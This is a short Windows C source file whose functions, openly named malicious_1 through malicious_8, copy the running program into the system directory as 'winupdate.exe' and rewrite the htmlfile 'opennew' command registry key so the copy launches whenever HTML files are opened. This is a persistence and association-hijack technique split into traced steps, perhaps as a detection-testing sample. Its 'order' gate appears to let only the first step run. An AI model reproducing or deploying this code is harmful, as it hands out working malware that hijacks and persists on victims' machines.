#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
#include <shellapi.h>

int order = 0;

char MyPath[256];
char CpyPath[256];
HKEY Key32;

void malicious_1(){
    printf("malicious_1\n");
	if((1 - order) == 1){
		order = 1;
		GetModuleFileName(NULL,MyPath,sizeof(MyPath));
        printf("run malicious_1\n");
	}

}

void malicious_2(){
    printf("malicious_2\n");
	if((1 - order) == 1){
		order = 2;
		GetSystemDirectory(CpyPath,sizeof(CpyPath));
        printf("run malicious_2\n");
	}
}

void malicious_3(){
    printf("malicious_3\n");
	if((1 - order) == 1){
		order = 3;
		strcat(CpyPath,"\\winupdate.exe");
		printf("run malicious_3\n");
	}
}

void malicious_4(){
    printf("malicious_4\n");
	if((1 - order) == 1){
		order = 4;
		CopyFile(MyPath,CpyPath,FALSE);
		printf("run malicious_4\n");
	}
}

void malicious_5(){
    printf("malicious_5\n");
	if((1 - order) == 1){
		order = 5;
		strcat(CpyPath," %1");
		printf("run malicious_5\n");
	}
}

void malicious_6(){
    printf("malicious_6\n");
	if((1 - order) == 1){
		order = 6;
		RegOpenKeyEx(HKEY_CLASSES_ROOT,"htmlfile\\shell\\opennew\\command",0,KEY_WRITE,&Key32);
		printf("run malicious_6\n");
	}
}

void malicious_7(){
    printf("malicious_7\n");
	if((1 - order) == 1){
		order = 7;
		RegSetValueEx(Key32,"",0,REG_SZ,CpyPath,strlen(CpyPath));
		printf("run malicious_7\n");
	}
}

void malicious_8(){
    printf("malicious_8\n");
	if((1 - order) == 1){
		order = 8;
		RegCloseKey(Key32);
		printf("run malicious_8\n");
	}
}

